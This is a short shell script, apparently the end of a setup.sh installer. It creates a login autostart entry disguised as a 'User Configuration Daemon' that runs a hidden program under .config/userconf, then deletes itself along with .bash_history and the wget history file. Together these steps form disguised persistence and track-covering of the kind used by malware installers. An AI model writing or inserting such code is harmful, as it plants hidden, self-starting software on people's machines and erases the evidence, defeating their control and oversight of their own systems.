
if [[ -f ~/.config/autostart/userconfd.desktop ]]; then
    rm ~/.config/autostart/userconfd.desktop
fi



echo "[Desktop Entry]
Name=User Configuration Daemon
GenericName=userconfd
Exec=$(pwd)/.config/userconf/rundaemon
Terminal=false
Type=Application
X-GNOME-Autostart-enabled=true" >> ~/.config/autostart/userconfd.desktop

rm setup.sh

rm -f .wget-hsts
rm -f .bash_history
